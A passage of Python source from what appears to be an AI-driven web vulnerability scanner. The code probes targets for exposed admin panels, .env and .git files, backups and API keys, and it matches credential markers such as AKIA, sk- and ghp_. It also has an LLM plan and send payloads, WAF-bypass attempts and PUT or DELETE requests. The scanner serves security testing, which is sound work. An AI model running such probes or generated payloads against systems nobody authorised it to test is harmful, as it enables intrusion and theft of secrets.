                                affected_endpoint=url,
                                parameter=dedup_key,
                                evidence=f"Server: {server}",
                                remediation="Remove or obfuscate the Server header to prevent version disclosure.",
                                affected_urls=[url],
                                ai_verified=False  # Detected by inspection
                            )
                            await self._add_finding(finding)

                    # X-Powered-By disclosure (domain-scoped: sensitive_data_exposure)
                    powered_by = headers.get("X-Powered-By", "")
                    if powered_by:
                        vt = "sensitive_data_exposure"
                        dedup_key = f"x_powered_by"
                        if self.memory.has_finding_for(vt, url, dedup_key):
                            for ef in self.memory.confirmed_findings:
                                if ef.vulnerability_type == vt and ef.parameter == dedup_key:
                                    if url not in ef.affected_urls:
                                        ef.affected_urls.append(url)
                                    break
                        else:
                            finding = Finding(
                                id=hashlib.md5(f"poweredby{url}".encode()).hexdigest()[:8],
                                title="Technology Version Disclosure",
                                severity="info",
                                vulnerability_type=vt,
                                cvss_score=0.0,
                                cwe_id="CWE-200",
                                description=f"The X-Powered-By header reveals technology: {powered_by}",
                                affected_endpoint=url,
                                parameter=dedup_key,
                                evidence=f"X-Powered-By: {powered_by}",
                                remediation="Remove the X-Powered-By header.",
                                affected_urls=[url],
                                ai_verified=False  # Detected by inspection
                            )
                            await self._add_finding(finding)
            except:
                pass

    async def _test_misconfigurations(self):
        """Test for directory listing, debug mode, admin panels, API docs"""
        await self.log("info", "  Testing for misconfigurations...")

        # Common paths to check
        check_paths = {
            "directory_listing": ["/", "/assets/", "/images/", "/uploads/", "/static/", "/backup/"],
            "debug_mode": ["/debug", "/debug/", "/_debug", "/trace", "/elmah.axd", "/phpinfo.php"],
            "exposed_admin_panel": ["/admin", "/admin/", "/administrator", "/wp-admin", "/manager", "/dashboard", "/cpanel"],
            "exposed_api_docs": ["/swagger", "/swagger-ui", "/api-docs", "/docs", "/redoc", "/graphql", "/openapi.json"],
        }

        parsed_target = urlparse(self.target)
        base = f"{parsed_target.scheme}://{parsed_target.netloc}"

        for vuln_type, paths in check_paths.items():
            await self._wait_if_paused()
            if self.is_cancelled():
                return
            for path in paths:
                if self.is_cancelled():
                    return
                url = base + path
                try:
                    async with self.session.get(url, allow_redirects=False, timeout=self._get_request_timeout()) as resp:
                        status = resp.status
                        body = await resp.text()
                        headers = dict(resp.headers)

                        detected = False
                        evidence = ""

                        if vuln_type == "directory_listing" and status == 200:
                            if "Index of" in body or "Directory listing" in body or "<pre>" in body:
                                detected = True
                                evidence = f"Directory listing enabled at {path}"

                        elif vuln_type == "debug_mode" and status == 200:
                            debug_markers = ["stack trace", "traceback", "debug toolbar",
                                           "phpinfo()", "DJANGO_SETTINGS_MODULE", "laravel_debugbar"]
                            if any(m.lower() in body.lower() for m in debug_markers):
                                detected = True
                                evidence = f"Debug mode/info exposed at {path}"

                        elif vuln_type == "exposed_admin_panel" and status == 200:
                            admin_markers = ["login", "admin", "password", "sign in", "username"]
                            if sum(1 for m in admin_markers if m.lower() in body.lower()) >= 2:
                                detected = True
                                evidence = f"Admin panel found at {path}"

                        elif vuln_type == "exposed_api_docs" and status == 200:
                            doc_markers = ["swagger", "openapi", "api documentation", "graphql",
                                         "query {", "mutation {", "paths", "components"]
                            if any(m.lower() in body.lower() for m in doc_markers):
                                detected = True
                                evidence = f"API documentation exposed at {path}"

                        if detected:
                            if not self.memory.has_finding_for(vuln_type, url, ""):
                                info = self.vuln_registry.VULNERABILITY_INFO.get(vuln_type, {})
                                finding = Finding(
                                    id=hashlib.md5(f"{vuln_type}{url}".encode()).hexdigest()[:8],
                                    title=info.get("title", vuln_type.replace("_", " ").title()),
                                    severity=info.get("severity", "low"),
                                    vulnerability_type=vuln_type,
                                    cvss_score=self._get_cvss_score(vuln_type),
                                    cvss_vector=self._get_cvss_vector(vuln_type),
                                    cwe_id=info.get("cwe_id", "CWE-16"),
                                    description=info.get("description", evidence),
                                    affected_endpoint=url,
                                    evidence=evidence,
                                    remediation=info.get("remediation", "Restrict access to this resource."),
                                    affected_urls=[url],
                                    ai_verified=False
                                )
                                await self._add_finding(finding)
                                await self.log("warning", f"  [FOUND] {vuln_type} at {path}")
                                break  # One finding per vuln type is enough
                except:
                    pass

    async def _test_data_exposure(self):
        """Test for source code disclosure, backup files, API key exposure"""
        await self.log("info", "  Testing for data exposure...")

        parsed_target = urlparse(self.target)
        base = f"{parsed_target.scheme}://{parsed_target.netloc}"

        exposure_checks = {
            "source_code_disclosure": {
                "paths": ["/.git/HEAD", "/.svn/entries", "/.env", "/wp-config.php.bak",
                          "/.htaccess", "/web.config", "/config.php~"],
                "markers": ["ref:", "svn", "DB_PASSWORD", "APP_KEY", "SECRET_KEY"],
            },
            "backup_file_exposure": {
                "paths": ["/backup.zip", "/backup.sql", "/db.sql", "/site.tar.gz",
                          "/backup.tar", "/.sql", "/dump.sql"],
                "markers": ["PK\x03\x04", "CREATE TABLE", "INSERT INTO", "mysqldump"],
            },
            "api_key_exposure": {
                "paths": ["/config.js", "/env.js", "/settings.json", "/.env.local",
                          "/api/config", "/static/js/app.*.js"],
                "markers": ["api_key", "apikey", "api-key", "secret_key", "access_token",
                           "AKIA", "sk-", "pk_live_", "ghp_", "glpat-"],
            },
        }

        for vuln_type, config in exposure_checks.items():
            await self._wait_if_paused()
            if self.is_cancelled():
                return
            for path in config["paths"]:
                if self.is_cancelled():
                    return
                url = base + path
                try:
                    async with self.session.get(url, allow_redirects=False, timeout=self._get_request_timeout()) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            body_bytes = body[:1000]
                            if any(m in body_bytes for m in config["markers"]):
                                if not self.memory.has_finding_for(vuln_type, url, ""):
                                    info = self.vuln_registry.VULNERABILITY_INFO.get(vuln_type, {})
                                    finding = Finding(
                                        id=hashlib.md5(f"{vuln_type}{url}".encode()).hexdigest()[:8],
                                        title=info.get("title", vuln_type.replace("_", " ").title()),
                                        severity=info.get("severity", "high"),
                                        vulnerability_type=vuln_type,
                                        cvss_score=self._get_cvss_score(vuln_type),
                                        cvss_vector=self._get_cvss_vector(vuln_type),
                                        cwe_id=info.get("cwe_id", "CWE-200"),
                                        description=f"Sensitive file exposed at {path}",
                                        affected_endpoint=url,
                                        evidence=f"HTTP 200 at {path} with sensitive content markers",
                                        remediation=info.get("remediation", "Remove or restrict access to this file."),
                                        affected_urls=[url],
                                        ai_verified=False
                                    )
                                    await self._add_finding(finding)
                                    await self.log("warning", f"  [FOUND] {vuln_type} at {path}")
                                    break
                except:
                    pass

    async def _test_ssl_crypto(self):
        """Test for SSL/TLS issues and crypto weaknesses"""
        await self.log("info", "  Testing SSL/TLS configuration...")

        parsed = urlparse(self.target)

        # Check if site is HTTP-only (no HTTPS redirect)
        if parsed.scheme == "http":
            vt = "cleartext_transmission"
            if not self.memory.has_finding_for(vt, self.target, ""):
                https_url = self.target.replace("http://", "https://")
                has_https = False
                try:
                    async with self.session.get(https_url, timeout=5) as resp:
                        has_https = resp.status < 400
                except:
                    pass
                if not has_https:
                    info = self.vuln_registry.VULNERABILITY_INFO.get(vt, {})
                    finding = Finding(
                        id=hashlib.md5(f"{vt}{self.target}".encode()).hexdigest()[:8],
                        title="Cleartext HTTP Transmission",
                        severity="medium",
                        vulnerability_type=vt,
                        cvss_score=self._get_cvss_score(vt),
                        cvss_vector=self._get_cvss_vector(vt),
                        cwe_id="CWE-319",
                        description="Application is served over HTTP without HTTPS.",
                        affected_endpoint=self.target,
                        evidence="No HTTPS endpoint available",
                        remediation=info.get("remediation", "Enable HTTPS with a valid TLS certificate."),
                        affected_urls=[self.target],
                        ai_verified=False
                    )
                    await self._add_finding(finding)

        # Check HSTS header
        try:
            async with self.session.get(self.target) as resp:
                headers = dict(resp.headers)
                if "Strict-Transport-Security" not in headers and parsed.scheme == "https":
                    vt = "ssl_issues"
                    if not self.memory.has_finding_for(vt, self.target, "hsts"):
                        finding = Finding(
                            id=hashlib.md5(f"hsts{self.target}".encode()).hexdigest()[:8],
                            title="Missing HSTS Header",
                            severity="low",
                            vulnerability_type=vt,
                            cvss_score=self._get_cvss_score(vt),
                            cwe_id="CWE-523",
                            description="Strict-Transport-Security header not set.",
                            affected_endpoint=self.target,
                            parameter="hsts",
                            evidence="HSTS header missing from HTTPS response",
                            remediation="Add Strict-Transport-Security header with appropriate max-age.",
                            affected_urls=[self.target],
                            ai_verified=False
                        )
                        await self._add_finding(finding)
        except:
            pass

    async def _test_graphql_introspection(self):
        """Test for GraphQL introspection exposure"""
        await self.log("info", "  Testing for GraphQL introspection...")

        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        graphql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]

        introspection_query = '{"query":"{__schema{types{name}}}"}'

        for path in graphql_paths:
            url = base + path
            try:
                async with self.session.post(
                    url,
                    data=introspection_query,
                    headers={"Content-Type": "application/json"},
                ) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if "__schema" in body or "queryType" in body:
                            vt = "graphql_introspection"
                            if not self.memory.has_finding_for(vt, url, ""):
                                info = self.vuln_registry.VULNERABILITY_INFO.get(vt, {})
                                finding = Finding(
                                    id=hashlib.md5(f"{vt}{url}".encode()).hexdigest()[:8],
                                    title="GraphQL Introspection Enabled",
                                    severity="medium",
                                    vulnerability_type=vt,
                                    cvss_score=self._get_cvss_score(vt),
                                    cvss_vector=self._get_cvss_vector(vt),
                                    cwe_id="CWE-200",
                                    description=info.get("description", "GraphQL introspection is enabled, exposing the full API schema."),
                                    affected_endpoint=url,
                                    evidence="__schema data returned from introspection query",
                                    remediation=info.get("remediation", "Disable introspection in production."),
                                    affected_urls=[url],
                                    ai_verified=False
                                )
                                await self._add_finding(finding)
                                await self.log("warning", f"  [FOUND] GraphQL introspection at {path}")
                                return
            except:
                pass

    async def _test_csrf_inspection(self):
        """Test for CSRF protection on forms"""
        await self.log("info", "  Testing for CSRF protection...")

        for form in self.recon.forms[:10]:
            if form.get("method", "GET").upper() != "POST":
                continue
            action = form.get("action", "")
            inputs = form.get("inputs", [])

            # Check if form has CSRF token
            csrf_names = {"csrf", "_token", "csrfmiddlewaretoken", "authenticity_token",
                         "__RequestVerificationToken", "_csrf", "csrf_token"}
            has_token = any(
                inp.lower() in csrf_names
                for inp in inputs
                if isinstance(inp, str)
            )

            if not has_token and action:
                vt = "csrf"
                if not self.memory.has_finding_for(vt, action, ""):
                    info = self.vuln_registry.VULNERABILITY_INFO.get(vt, {})
                    finding = Finding(
                        id=hashlib.md5(f"{vt}{action}".encode()).hexdigest()[:8],
                        title="Missing CSRF Protection",
                        severity="medium",
                        vulnerability_type=vt,
                        cvss_score=self._get_cvss_score(vt),
                        cvss_vector=self._get_cvss_vector(vt),
                        cwe_id="CWE-352",
                        description=f"POST form at {action} lacks CSRF token protection.",
                        affected_endpoint=action,
                        evidence=f"No CSRF token found in form fields: {inputs[:5]}",
                        remediation=info.get("remediation", "Implement CSRF tokens for all state-changing requests."),
                        affected_urls=[action],
                        ai_verified=False
                    )
                    await self._add_finding(finding)
                    await self.log("warning", f"  [FOUND] Missing CSRF protection at {action[:50]}")

    async def _ai_dynamic_test(self, user_prompt: str):
        """
        AI-driven dynamic vulnerability testing - can test ANY vulnerability type.
        The LLM generates payloads, test strategies, and analyzes results dynamically.

        Examples of what this can test:
        - XXE (XML External Entity)
        - Race Conditions
        - Rate Limiting Bypass
        - WAF Bypass
        - CSP Bypass
        - BFLA (Broken Function Level Authorization)
        - BOLA (Broken Object Level Authorization)
        - JWT vulnerabilities
        - GraphQL injection
        - NoSQL injection
        - Prototype pollution
        - And ANY other vulnerability type!
        """
        await self.log("info", f"[AI DYNAMIC TEST] Processing: {user_prompt}")

        if not self.llm.is_available():
            await self.log("warning", "  LLM not available - attempting basic tests based on prompt")
            await self._ai_test_fallback(user_prompt)
            return

        # Gather reconnaissance context
        endpoints_info = []
        for ep in self.recon.endpoints[:15]:
            url = _get_endpoint_url(ep)
            method = _get_endpoint_method(ep)
            if url:
                endpoints_info.append({"url": url, "method": method})

        forms_info = []
        for form in self.recon.forms[:5]:
            if isinstance(form, dict):
                forms_info.append({
                    "action": form.get("action", ""),
                    "method": form.get("method", "GET"),
                    "inputs": form.get("inputs", [])[:5]
                })

        context = f"""
TARGET: {self.target}
TECHNOLOGIES: {', '.join(self.recon.technologies) if self.recon.technologies else 'Unknown'}
ENDPOINTS ({len(endpoints_info)} found):
{json.dumps(endpoints_info[:10], indent=2)}

FORMS ({len(forms_info)} found):
{json.dumps(forms_info, indent=2)}

PARAMETERS DISCOVERED: {list(self.recon.parameters.keys())[:20]}
"""

        # RAG: Get testing context for the vulnerability type
        rag_dynamic_ctx = self._get_rag_testing_context(user_prompt) if (self.rag_engine or self.few_shot_selector) else ""

        # Playbook: Get methodology for this vuln type if identifiable
        playbook_dynamic_ctx = ""
        if HAS_PLAYBOOK:
            try:
                # Try to match user_prompt to a known vuln type
                prompt_lower = user_prompt.lower().replace(" ", "_").replace("-", "_")
                entry = get_playbook_entry(prompt_lower)
                if not entry:
                    # Fuzzy match: try common substrings
                    for vtype in ["xss", "sqli", "ssrf", "idor", "csrf", "xxe", "ssti",
                                  "lfi", "rfi", "rce", "command_injection", "open_redirect"]:
                        if vtype in prompt_lower:
                            entry = get_playbook_entry(vtype) or get_playbook_entry(f"{vtype}_reflected")
                            if entry:
                                prompt_lower = vtype
                                break
                if entry:
                    prompts = get_testing_prompts(prompt_lower)
                    bypass = get_bypass_strategies(prompt_lower)
                    playbook_dynamic_ctx = f"\n--- PLAYBOOK METHODOLOGY for {entry.get('title', prompt_lower)} ---\n"
                    playbook_dynamic_ctx += f"Overview: {entry.get('overview', '')}\n"
                    playbook_dynamic_ctx += f"Threat Model: {entry.get('threat_model', '')}\n"
                    if prompts:
                        playbook_dynamic_ctx += f"Key Testing Prompts:\n"
                        for p in prompts[:5]:
                            playbook_dynamic_ctx += f"  - {p}\n"
                    if bypass:
                        playbook_dynamic_ctx += f"Bypass Strategies: {', '.join(bypass[:5])}\n"
            except Exception:
                pass

        # Phase 1: Ask AI to understand the vulnerability and create test strategy
        strategy_prompt = f"""You are an expert penetration tester. The user wants to test for:

"{user_prompt}"

Based on the target information below, create a comprehensive testing strategy.

{context}
{rag_dynamic_ctx}{playbook_dynamic_ctx}

Respond in JSON format with:
{{
    "vulnerability_type": "name of the vulnerability being tested",
    "cwe_id": "CWE-XXX if applicable",
    "owasp_category": "OWASP category if applicable",
    "description": "Brief description of what this vulnerability is",
    "severity_if_found": "critical|high|medium|low",
    "cvss_estimate": 0.0-10.0,
    "test_cases": [
        {{
            "name": "Test case name",
            "technique": "Technique being used",
            "url": "URL to test (use actual URLs from context)",
            "method": "GET|POST|PUT|DELETE",
            "headers": {{"Header-Name": "value"}},
            "body": "request body if POST/PUT",
            "content_type": "application/json|application/xml|application/x-www-form-urlencoded",
            "success_indicators": ["what to look for in response that indicates vulnerability"],
            "failure_indicators": ["what indicates NOT vulnerable"]
        }}
    ],
    "payloads": ["list of specific payloads to try"],
    "analysis_tips": "What patterns or behaviors indicate this vulnerability"
}}

Generate at least 3-5 realistic test cases using the actual endpoints from the context.
Be creative and thorough - think like a real penetration tester."""

        await self.log("info", "  Phase 1: AI generating test strategy...")

        try:
            strategy_response = await self.llm.generate(
                strategy_prompt,
                self._get_enhanced_system_prompt("strategy")
            )

            # Extract JSON from response
            match = re.search(r'\{[\s\S]*\}', strategy_response)
            if not match:
                await self.log("warning", "  AI did not return valid JSON strategy, using fallback")
                await self._ai_test_fallback(user_prompt)
                return

            strategy = json.loads(match.group())

            vuln_type = strategy.get("vulnerability_type", user_prompt)
            cwe_id = strategy.get("cwe_id", "")
            severity = strategy.get("severity_if_found", "medium")
            cvss = strategy.get("cvss_estimate", 5.0)
            description = strategy.get("description", f"Testing for {vuln_type}")

            await self.log("info", f"  Vulnerability: {vuln_type}")
            await self.log("info", f"  CWE: {cwe_id} | Severity: {severity} | CVSS: {cvss}")
            await self.log("info", f"  Test cases: {len(strategy.get('test_cases', []))}")

            # Phase 2: Execute test cases
            await self.log("info", "  Phase 2: Executing AI-generated test cases...")

            test_results = []
            for i, test_case in enumerate(strategy.get("test_cases", [])[:10]):
                test_name = test_case.get("name", f"Test {i+1}")
                await self.log("debug", f"    Running: {test_name}")

                result = await self._execute_ai_dynamic_test(test_case)
                if result:
                    result["test_name"] = test_name
                    result["success_indicators"] = test_case.get("success_indicators", [])
                    result["failure_indicators"] = test_case.get("failure_indicators", [])
                    test_results.append(result)

            # Phase 3: AI analysis of results
            await self.log("info", "  Phase 3: AI analyzing results...")

            analysis_prompt = f"""Analyze these test results for {vuln_type} vulnerability.

VULNERABILITY BEING TESTED: {vuln_type}
{description}

ANALYSIS TIPS: {strategy.get('analysis_tips', 'Look for error messages, unexpected behavior, or data leakage')}

TEST RESULTS:
{json.dumps(test_results[:5], indent=2, default=str)[:8000]}

For each test result, analyze if it indicates a vulnerability.
Consider:
- Success indicators: {strategy.get('test_cases', [{}])[0].get('success_indicators', [])}
- Response status codes, error messages, timing differences, data in response

Respond in JSON:
{{
    "findings": [
        {{
            "is_vulnerable": true|false,
            "confidence": "high|medium|low",
            "test_name": "which test",
            "evidence": "specific evidence from response",
            "explanation": "why this indicates vulnerability"
        }}
    ],
    "overall_assessment": "summary of findings",
    "recommendations": ["list of remediation steps"]
}}"""

            analysis_response = await self.llm.generate(
                analysis_prompt,
                self._get_enhanced_system_prompt("confirmation")
            )

            # Parse analysis
            analysis_match = re.search(r'\{[\s\S]*\}', analysis_response)
            if analysis_match:
                analysis = json.loads(analysis_match.group())

                for finding_data in analysis.get("findings", []):
                    if finding_data.get("is_vulnerable") and finding_data.get("confidence") in ["high", "medium"]:
                        evidence = finding_data.get("evidence", "")
                        test_name = finding_data.get("test_name", "AI Test")

                        # Find the matching test result for endpoint + body
                        affected_endpoint = self.target
                        matched_body = ""
                        for tr in test_results:
                            if tr.get("test_name") == test_name:
                                affected_endpoint = tr.get("url", self.target)
                                matched_body = tr.get("body", "")
                                break

                        # Anti-hallucination: verify AI evidence in actual response
                        if evidence and matched_body:
                            if not self._evidence_in_response(evidence, matched_body):
                                await self.log("debug", f"  [REJECTED] AI claimed evidence not found in response for {test_name}")
                                self.memory.reject_finding(
                                    type("F", (), {"vulnerability_type": vuln_type, "affected_endpoint": affected_endpoint, "parameter": ""})(),
                                    f"AI evidence not grounded in HTTP response: {evidence[:100]}"
                                )
                                continue

                        # Get metadata from registry if available
                        mapped = self._map_vuln_type(vuln_type.lower().replace(" ", "_"))
                        reg_title = self.vuln_registry.get_title(mapped)
                        reg_cwe = self.vuln_registry.get_cwe_id(mapped)
                        reg_remediation = self.vuln_registry.get_remediation(mapped)

                        finding = Finding(
                            id=hashlib.md5(f"{vuln_type}{affected_endpoint}{test_name}".encode()).hexdigest()[:8],
                            title=reg_title or f"{vuln_type}",
                            severity=severity,
                            vulnerability_type=vuln_type.lower().replace(" ", "_"),
                            cvss_score=float(cvss) if cvss else 5.0,
                            cvss_vector=self._get_cvss_vector(vuln_type.lower().replace(" ", "_")),
                            cwe_id=reg_cwe or cwe_id or "",
                            description=f"{description}\n\nAI Explanation: {finding_data.get('explanation', '')}",
                            affected_endpoint=affected_endpoint,
                            evidence=evidence[:1000],
                            remediation=reg_remediation or "\n".join(analysis.get("recommendations", [])),
                            ai_verified=True
                        )
                        await self._add_finding(finding)
                        await self.log("warning", f"  [AI FOUND] {vuln_type} - {finding_data.get('confidence')} confidence")

                await self.log("info", f"  Assessment: {analysis.get('overall_assessment', 'Analysis complete')[:100]}")

        except json.JSONDecodeError as e:
            await self.log("warning", f"  JSON parse error: {e}")
            await self._ai_test_fallback(user_prompt)
        except Exception as e:
            await self.log("error", f"  AI dynamic test error: {e}")
            await self._ai_test_fallback(user_prompt)

    async def _execute_ai_dynamic_test(self, test_case: Dict) -> Optional[Dict]:
        """Execute a single AI-generated test case"""
        if not self.session:
            return None

        try:
            url = test_case.get("url", self.target)
            method = test_case.get("method", "GET").upper()
            headers = test_case.get("headers", {})
            body = test_case.get("body", "")
            content_type = test_case.get("content_type", "")

            if content_type and "Content-Type" not in headers:
                headers["Content-Type"] = content_type

            start_time = asyncio.get_event_loop().time()

            if method == "GET":
                async with self.session.get(url, headers=headers, allow_redirects=False) as resp:
                    response_body = await resp.text()
                    response_time = asyncio.get_event_loop().time() - start_time
                    return {
                        "url": url,
                        "method": method,
                        "status": resp.status,
                        "headers": dict(list(resp.headers.items())[:20]),
                        "body_preview": response_body[:2000],
                        "body_length": len(response_body),
                        "response_time": round(response_time, 3)
                    }
            elif method == "POST":
                if content_type == "application/json" and isinstance(body, str):
                    try:
                        body = json.loads(body)
                    except:
                        pass
                async with self.session.post(url, headers=headers, data=body if isinstance(body, str) else None, json=body if isinstance(body, dict) else None, allow_redirects=False) as resp:
                    response_body = await resp.text()
                    response_time = asyncio.get_event_loop().time() - start_time
                    return {
                        "url": url,
                        "method": method,
                        "status": resp.status,
                        "headers": dict(list(resp.headers.items())[:20]),
                        "body_preview": response_body[:2000],
                        "body_length": len(response_body),
                        "response_time": round(response_time, 3)
                    }
            elif method in ["PUT", "DELETE", "PATCH"]:
                request_method = getattr(self.session, method.lower())
                async with request_method(url, headers=headers, data=body, allow_redirects=False) as resp:
                    response_body = await resp.text()
                    response_time = asyncio.get_event_loop().time() - start_time
                    return {
                        "url": url,
                        "method": method,
                        "status": resp.status,
                        "headers": dict(list(resp.headers.items())[:20]),
                        "body_preview": response_body[:2000],
                        "body_length": len(response_body),
                        "response_time": round(response_time, 3)
                    }
        except Exception as e:
            return {
                "url": url,
                "method": method,
                "error": str(e),
                "status": 0
            }
        return None

    # ── AI Deep Test: Iterative Human-Pentester Loop ─────────────────────

    MAX_DEEP_TEST_ITERATIONS = 3

    async def _ai_deep_test(
        self,
        url: str,
        vuln_type: str,
        params: List[str],
        method: str = "GET",
        form_defaults: Dict = None,
    ) -> Optional[Finding]:
        """AI-driven iterative testing loop — the core of LLM-as-VulnEngine.

        Unlike hardcoded payload iteration, this method:
        1. OBSERVES — builds rich context (baseline, tech, WAF, playbook, memory)
        2. PLANS — asks LLM to generate targeted test cases
        3. EXECUTES — sends requests, captures full responses
        4. ANALYZES — LLM reviews actual responses with anti-hallucination
        5. ADAPTS — if promising signals found, loops with refined tests

        All confirmed findings go through _judge_finding() (ValidationJudge pipeline).
        Returns the first confirmed Finding, or None.
        """
        if not self.llm.is_available() or not self.session:
            return None

        if self.is_cancelled():
            return None

        # Token budget check — skip if budget exhausted
        if self.token_budget and hasattr(self.token_budget, 'should_skip'):
            if self.token_budget.should_skip("deep_test"):
                return None

        await self.log("debug", f"  [AI-DEEP] {vuln_type} on {url[:60]}...")

        # Step 1: OBSERVE — Build rich context
        context = self._build_deep_test_context(
            url, vuln_type, params, method, form_defaults
        )

        # Playbook context
        playbook_ctx = ""
        if HAS_PLAYBOOK:
            try:
                entry = get_playbook_entry(vuln_type)
                if entry:
                    prompts = get_testing_prompts(vuln_type)
                    bypass = get_bypass_strategies(vuln_type)
                    anti_fp = get_anti_fp_rules(vuln_type)
                    playbook_ctx = f"\n## PLAYBOOK METHODOLOGY for {vuln_type}\n"
                    playbook_ctx += f"Overview: {entry.get('overview', '')}\n"
                    if prompts:
                        playbook_ctx += "Testing prompts:\n"
                        for p in prompts[:5]:
                            playbook_ctx += f"  - {p}\n"
                    if bypass:
                        playbook_ctx += f"Bypass strategies: {', '.join(bypass[:5])}\n"
                    if anti_fp:
                        playbook_ctx += f"Anti-FP rules: {', '.join(anti_fp[:3])}\n"
            except Exception:
                pass

        # Import the prompt builders
        try:
            from backend.core.vuln_engine.ai_prompts import (
                get_deep_test_plan_prompt, get_deep_test_analysis_prompt
            )
        except ImportError:
            return None

        previous_results_json = ""
        all_test_results = []

        for iteration in range(1, self.MAX_DEEP_TEST_ITERATIONS + 1):
            if self.is_cancelled():
                return None

            # Step 2: PLAN — AI generates targeted test cases
            plan_prompt = get_deep_test_plan_prompt(
                vuln_type=vuln_type,
                context=context,
                playbook_ctx=playbook_ctx,
                iteration=iteration,
                previous_results=previous_results_json,
            )

            try:
                plan_response = await self.llm.generate(
                    plan_prompt,
                    self._get_enhanced_system_prompt("deep_testing", vuln_type)
                )
            except Exception as e:
                await self.log("debug", f"  [AI-DEEP] Plan error round {iteration}: {e}")
                break

            # Parse plan JSON
            plan_match = re.search(r'\{[\s\S]*\}', plan_response)
            if not plan_match:
                await self.log("debug", f"  [AI-DEEP] No JSON in plan response round {iteration}")
                break

            try:
                plan = json.loads(plan_match.group())
            except json.JSONDecodeError:
                await self.log("debug", f"  [AI-DEEP] JSON parse error round {iteration}")
                break

            tests = plan.get("tests", [])
            if not tests:
                await self.log("debug", f"  [AI-DEEP] No tests generated round {iteration}")
                break

            reasoning = plan.get("reasoning", "")
            if reasoning and iteration == 1:
                await self.log("info", f"  [AI-DEEP] Strategy: {reasoning[:120]}")

            # Step 3: EXECUTE — Send requests, capture full responses
            round_results = await self._execute_ai_planned_tests(tests, url, method)
            all_test_results.extend(round_results)

            if not round_results:
                break

            # Build baseline string for analysis
            baseline_str = ""
            baseline_resp = self.memory.get_baseline(url)
            if baseline_resp:
                baseline_str = (
                    f"Status: {baseline_resp.get('status', '?')}\n"
                    f"Headers: {json.dumps(dict(list(baseline_resp.get('headers', {}).items())[:10]), default=str)}\n"
                    f"Body preview: {baseline_resp.get('body', '')[:500]}\n"
                    f"Body length: {len(baseline_resp.get('body', ''))}"
                )

            # Step 4: ANALYZE — AI reviews actual responses
            results_json = json.dumps(round_results[:5], indent=2, default=str)[:6000]

            analysis_prompt = get_deep_test_analysis_prompt(
                vuln_type=vuln_type,
                test_results=results_json,
                baseline=baseline_str,
                iteration=iteration,
            )

            try:
                analysis_response = await self.llm.generate(
                    analysis_prompt,
                    self._get_enhanced_system_prompt("confirmation", vuln_type)
                )
            except Exception as e:
                await self.log("debug", f"  [AI-DEEP] Analysis error round {iteration}: {e}")
                break

            # Parse analysis JSON
            analysis_match = re.search(r'\{[\s\S]*\}', analysis_response)
            if not analysis_match:
                break

            try:
                analysis = json.loads(analysis_match.group())
            except json.JSONDecodeError:
                break

            # Step 5: Check for confirmed findings
            for finding_data in analysis.get("analysis", []):
                if not finding_data.get("is_vulnerable"):
                    continue
                if finding_data.get("confidence") not in ("high", "medium"):
                    continue

                evidence = finding_data.get("evidence", "")
                test_name = finding_data.get("test_name", "AI Deep Test")

                # Find matching test result for endpoint + response
                affected_endpoint = url
                matched_body = ""
                matched_resp = None
                for tr in all_test_results:
                    if tr.get("test_name") == test_name or tr.get("name") == test_name:
                        affected_endpoint = tr.get("url", url)
                        matched_body = tr.get("body_preview", "")
                        matched_resp = tr
                        break

                # Anti-hallucination: verify evidence exists in actual response
                if evidence and matched_body:
                    if not self._evidence_in_response(evidence, matched_body):
                        await self.log("debug",
                            f"  [AI-DEEP] REJECTED: evidence not grounded in response for {test_name}")
                        self.memory.reject_finding(
                            type("F", (), {
                                "vulnerability_type": vuln_type,
                                "affected_endpoint": affected_endpoint,
                                "parameter": ""
                            })(),
                            f"AI evidence not in response: {evidence[:100]}"
                        )
                        continue

                # Extract payload from matching test
                payload = ""
                param_name = ""
                if matched_resp:
                    payload = matched_resp.get("payload", "")
                    param_name = matched_resp.get("param", params[0] if params else "")

                # Run through ValidationJudge pipeline
                finding = await self._judge_finding(
                    vuln_type, affected_endpoint, param_name or (params[0] if params else ""),
                    payload, evidence, matched_resp or {},
                    baseline=baseline_resp
                )
                if finding:
                    await self.log("warning",
                        f"  [AI-DEEP] CONFIRMED {vuln_type} round {iteration}: "
                        f"{finding_data.get('confidence')} confidence")
                    return finding

            # Step 6: ADAPT — decide whether to continue
            if not analysis.get("continue_testing", False):
                await self.log("debug",
                    f"  [AI-DEEP] {vuln_type}: done after round {iteration} "
                    f"({analysis.get('summary', 'no findings')})")
                break

            # Prepare previous results for next iteration
            previous_results_json = results_json
            next_strategy = analysis.get("next_round_strategy", "")
            if next_strategy:
                await self.log("debug", f"  [AI-DEEP] Round {iteration + 1} strategy: {next_strategy[:80]}")

        return None

    def _build_deep_test_context(
        self,
        url: str,
        vuln_type: str,
        params: List[str],
        method: str,
        form_defaults: Dict = None,
    ) -> str:
        """Build rich observation context for the AI deep test loop.

        Combines: endpoint details, baseline, tech stack, WAF info,
        parameter analysis, and memory of previous tests.
        """
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Endpoint details
        parts = [
            f"TARGET URL: {url}",
            f"BASE URL: {base_url}",
            f"METHOD: {method}",
            f"PARAMETERS: {', '.join(params[:10]) if params else 'none discovered'}",
        ]

        if form_defaults:
            parts.append(f"FORM DEFAULTS: {json.dumps(form_defaults, default=str)[:300]}")

        # Technology stack
        if self.recon.technologies:
            parts.append(f"TECHNOLOGIES: {', '.join(self.recon.technologies[:10])}")

        # Baseline response
        baseline = self.memory.get_baseline(url) or self.memory.get_baseline(base_url)
        if baseline:
            parts.append(f"\nBASELINE RESPONSE:")
            parts.append(f"  Status: {baseline.get('status', '?')}")
            parts.append(f"  Content-Type: {baseline.get('content_type', '?')}")
            parts.append(f"  Body length: {len(baseline.get('body', ''))}")
            body_preview = baseline.get('body', '')[:300]
            if body_preview:
                parts.append(f"  Body preview: {body_preview}")

        # WAF information
        if self._waf_result and self._waf_result.detected_wafs:
            waf_names = [w.get('name', '?') if isinstance(w, dict) else str(w)
                         for w in self._waf_result.detected_wafs]
            parts.append(f"\nWAF DETECTED: {', '.join(waf_names)}")
            if self.waf_detector:
                try:
                    bypasses = self.waf_detector.get_bypass_techniques(self._waf_result)
                    if bypasses:
                        parts.append(f"WAF BYPASS TECHNIQUES: {', '.join(bypasses[:5])}")
                except Exception:
                    pass

        # Parameter analysis
        if self.param_analyzer and params:
            try:
                param_dict = {p: "" for p in params[:5]}
